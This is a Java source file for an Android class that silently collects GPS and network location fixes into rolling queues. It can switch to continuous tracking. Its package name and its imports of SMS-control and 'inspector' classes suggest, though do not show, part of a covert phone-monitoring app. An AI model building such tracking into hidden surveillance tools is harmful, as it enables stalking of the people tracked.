package system.service.feature.location;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.Date;
import java.util.LinkedList;
import java.util.Queue;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.json.JSONArray;
import org.json.JSONObject;

import system.service.R;
import system.service.activity.GlobalPrefActivity;
import system.service.feature.sms.SmsCtrl;
import system.service.receiver.SmsReceiver;

import com.particle.inspector.common.util.GpsUtil;
import com.particle.inspector.common.util.NetworkUtil;
import com.particle.inspector.common.util.SIM_TYPE;
import com.particle.inspector.common.util.SysUtils;
import com.particle.inspector.common.util.location.BaseStationLocation;
import com.particle.inspector.common.util.location.BaseStationUtil;

import android.content.Context;
import android.location.Criteria;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.location.LocationProvider;
import android.os.Bundle;
import android.os.Looper;
import android.telephony.TelephonyManager;
import android.telephony.gsm.GsmCellLocation;
import android.util.Log;

public class LocationUtil 
{
	private static final String LOGTAG = "LocationUtil";
	
	private static final int DEFAULT_INTERVAL = 10000; // ms
	private static final float DEFAULT_DISTANCE = 200.f; // meter
	
	private Context context;
	private LocationManager locationManager = null;
	private GpsLocationlistener locationGpsListener = null;
	private NetworkLocationlistener locationNetworkListener = null;
	public LinkedList<Location> locationGpsQueue; // queue for GPS locations
	public LinkedList<Location> locationNetworkQueue;// queue for WIFI locations
	private static final int MAX_QUEUE_LEN = 50;   // MAX length for queue
	
	public LocationManager getLocationManager() {return this.locationManager;}
	
	public LocationUtil(Context context) {
		this.context = context;
		locationGpsQueue = new LinkedList<Location>();
		locationNetworkQueue = new LinkedList<Location>();
		try {
			locationManager = (LocationManager)context.getSystemService(Context.LOCATION_SERVICE);
			locationGpsListener = new GpsLocationlistener();
			locationNetworkListener = new NetworkLocationlistener();
			locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationGpsListener);
			locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationNetworkListener);
		} catch (Exception ex) {
			
		}
	}
	
	public void boost() {
		if (locationManager == null) return;
		
		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0, 0, locationGpsListener);
		locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0, 0, locationNetworkListener);
	}
	
	public void decelerate() {
		if (locationManager == null) return;
		
		locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationGpsListener);
		locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, DEFAULT_INTERVAL, DEFAULT_DISTANCE, locationNetworkListener);
	}
	
	public void destroy() {
		if (locationManager != null) {
			locationManager.removeUpdates(locationGpsListener);
			locationManager.removeUpdates(locationNetworkListener);
		}
	}
	
	private void addGpsLocation(Location location) {
        if (this.locationGpsQueue == null) return;
        if (this.locationGpsQueue.size() >= MAX_QUEUE_LEN) this.locationGpsQueue.poll();
        this.locationGpsQueue.offer(location);
    }
	
	private void addNetworkLocation(Location location) {
        if (this.locationNetworkQueue == null) return;
        if (this.locationNetworkQueue.size() >= MAX_QUEUE_LEN) this.locationNetworkQueue.poll();
        this.locationNetworkQueue.offer(location);
    }
	
	private class GpsLocationlistener implements LocationListener 
	{
		@Override
		public void onLocationChanged(Location location) {
			addGpsLocation(location);
		}

		@Override
		public void onProviderDisabled(String provider) {

		}

		@Override
		public void onProviderEnabled(String provider) {
			
		}

		@Override
		public void onStatusChanged(String provider, int status, Bundle extras) {
			
		};
	}
	
	private class NetworkLocationlistener implements LocationListener 
	{
		@Override
		public void onLocationChanged(Location location) {
			addNetworkLocation(location);
		}

		@Override
		public void onProviderDisabled(String provider) {

		}

		@Override
		public void onProviderEnabled(String provider) {
			
		}

		@Override
		public void onStatusChanged(String provider, int status, Bundle extras) {
			
		};
	}
}
